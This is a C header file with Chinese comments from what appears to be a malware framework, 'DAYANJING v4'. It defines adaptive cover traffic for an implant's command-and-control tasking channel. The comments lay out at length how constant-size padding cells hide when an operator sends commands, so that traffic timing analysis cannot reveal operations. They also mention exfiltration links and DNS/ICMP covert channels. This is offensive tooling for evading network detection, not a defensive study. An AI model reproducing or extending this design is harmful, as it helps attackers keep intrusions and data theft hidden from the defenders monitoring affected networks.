/*
 * DAYANJING v4 — exfil_task_cover.h
 *
 * 任务通道（命令/回执）的自适应覆盖流量维持。
 *
 * ====================================================================
 * 被解除的限制
 * ====================================================================
 * 此前覆盖流量只接进了采集回传通道（exfil_link_cover），任务通道在
 * 空闲期完全静默：服务端没有命令要下发、植入体也没有回执要上报时，
 * 链路上一个信元都不发。
 *
 * 这在观测上是致命的对应：
 *     「链路静默」==「操作员正在思考 / 植入体无事可做」
 *     「突发一个 512B 包」 ==「刚下了一条命令」
 * 观察者不必破解任何东西，只看包数的时间分布就能重建操作节奏，
 * 甚至能数出操作员一天下了几条命令、每次间隔多久。
 *
 * 本层让任务通道在空闲期按预算持续吐出恒定 512 字节的 PAD 信元，
 * 使「有命令」与「没命令」在线上不可区分——命令只是恰好夹在覆盖流里
 * 的一个信元，长度相同、方向相同、加密方式相同。
 *
 * ====================================================================
 * 为什么用 PAD 信元而不是"空操作命令"
 * ====================================================================
 * 两个候选方案：
 *   A) 新增 NOOP opcode，走正常帧层封装
 *   B) 复用信元层已有的 PAD 类型（cmd=2），接收端在信元层就丢弃
 *
 * 选 B，理由是 A 会污染应用层序号空间：
 *   - 命令帧的 seq 与 task_id 关联，NOOP 消耗 seq 会让 task_id 与实际
 *     任务脱节，回执对不上号
 *   - seq 是 uint64 虽然够用，但"操作员下了 3 条命令而 seq 涨到 800"
 *     本身就是一层可被反推的信息
 *   - NOOP 还要过一遍帧层 AEAD，而信元层已经认证过一次，纯属重复
 *
 * B 的代价是接收端必须能识别并丢弃 PAD，且不把它当成故障。这一点由
 * EXF_TASK_PAD 这个**正值**返回码表达——正值意味着"不是错误，但也不
 * 是你要的命令，继续读下一个"。
 *
 * ====================================================================
 * 三条硬规则
 * ====================================================================
 * 1) PAD 必须与数据共用同一个 cell 上下文。
 *    信元层 IV = pfx || counter，counter 由接收方现算。若另起一个上下文
 *    发覆盖，接收方会看到 counter 错位，表现为全线 AUTH——而真实原因
 *    只是"覆盖开了条旁路"。本层直接传 &ch->cell。
 *
 * 2) PAD 绝不动 seq。
 *    recv 端识别 PAD 后立即返回，不做 last_seq 更新。seq 只由真实命令
 *    推进，否则应用层重排防护会被覆盖流量稀释。
 *
 * 3) 覆盖速率不得与"是否刚发过命令"相关。
 *    若发送一条命令后立刻压低覆盖，观察者就能用覆盖流量的凹陷反推
 *    命令时点，隐蔽信道反而变成侧信道。本层只用 p2p_cover 的自适应
 *    速率（它只对持续趋势用 EWMA 响应），不因单次命令而抖动。
 *
 * ====================================================================
 * 时间注入
 * ====================================================================
 * now_ms 由调用方注入，本层不读系统时钟。因此测试可以把时间推进到
 * 任意点，不需要 sleep，"多久发一个覆盖"可以精确断言。
 */

#ifndef DAYANJING_EXFIL_TASK_COVER_H
#define DAYANJING_EXFIL_TASK_COVER_H

#include <stddef.h>
#include <stdint.h>

#include "exfil_task.h"
#include "exfil_task_link.h"
#include "p2p_cover.h"

#ifdef __cplusplus
extern "C" {
#endif

/* 返回码（本层错误域，与 exfil_task 的负值错误域区分） */
#define EXF_TASK_COVER_OK      0
#define EXF_TASK_COVER_ERR_ARG -1   /* 参数非法 / 未 init */
#define EXF_TASK_COVER_ERR_IO  -2   /* 写出失败（对端关闭） */

/* 一次 tick 允许发出的覆盖信元上限（防长时间未刷新时喷发） */
#define EXF_TASK_COVER_MAX_TICK  64u

/* 默认片长 */
#define EXF_TASK_COVER_PERIOD_MS 500u

typedef struct {
    p2p_cover_t cov;         /* 自适应速率（余量累积在内部） */
    uint32_t    period_ms;   /* 片长：不足一个片长不发，避免忙等 */
    uint32_t    budget_bpm;  /* 预算（字节/分钟）；0 = 明确禁用覆盖 */
    uint32_t    last_ms;     /* 上次刷新时刻（虚拟时间，由调用方注入） */
    uint64_t    cover_sent;  /* 累计发出的覆盖信元数（诊断） */
    int         inited;
} exfil_task_cover_t;

/*
 * 初始化。
 *   budget_bpm 为 0 表示明确禁用（不发覆盖，退化为静默链路）。
 *   period_ms 为 0 取默认 500ms。
 *   now_ms 为起始虚拟时刻。
 */
int exfil_task_cover_init(exfil_task_cover_t *tc, uint32_t profile,
                          uint32_t budget_bpm, uint32_t period_ms,
                          uint32_t now_ms);

/* 切换信道画像（换 DNS/ICMP 时覆盖自动缩放，低速信道不被打满） */
int exfil_task_cover_set_profile(exfil_task_cover_t *tc, uint32_t profile);

/* 用实测成本覆盖画像默认值（部署前必须实测回填） */
int exfil_task_cover_set_cost(exfil_task_cover_t *tc, uint32_t bytes_per_cell);

/* 调整预算；0 = 禁用 */
int exfil_task_cover_set_budget(exfil_task_cover_t *tc, uint32_t budget_bpm);

/* 设置覆盖速率上下限（信元/分钟） */
int exfil_task_cover_set_bounds(exfil_task_cover_t *tc, uint32_t min_per_min,
                                uint32_t max_per_min);

/*
 * 刷新一次：按经过的虚拟时间计算到期应发的覆盖信元数并写出。
 *
 * 这是"真实发送循环"的单步——长期运行应周期性调用（例如每次主循环
 * 迭代、或定时器到期）。未到期时返回 OK 且 out_cover=0，这是正常情况
 * 不是错误：余量还没凑够一个信元。
 *
 * out_cover 可为 NULL（不关心数量）。
 */
int exfil_task_cover_tick(exfil_task_chan_t *ch, exfil_task_cover_t *tc,
                          int fd, uint32_t now_ms, size_t *out_cover);

/*
 * 强制立刻发一个覆盖信元（不等到期）。
 * 供"即将进入静默期"或"刚建立链路"时抢先铺一个信元使用。
 */
int exfil_task_cover_burst(exfil_task_chan_t *ch, exfil_task_cover_t *tc,
                           int fd);

/* 观察：当前自适应覆盖速率（信元/分钟） */
uint32_t exfil_task_cover_rate(const exfil_task_cover_t *tc);

/* 观察：本分钟线上预计总字节数 */
uint32_t exfil_task_cover_projected_bpm(const exfil_task_cover_t *tc);

/* 清零（含密钥无关状态；cell 上下文由 exfil_task_chan_wipe 负责） */
void exfil_task_cover_wipe(exfil_task_cover_t *tc);

const char *exfil_task_cover_errstr(int e);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_EXFIL_TASK_COVER_H */
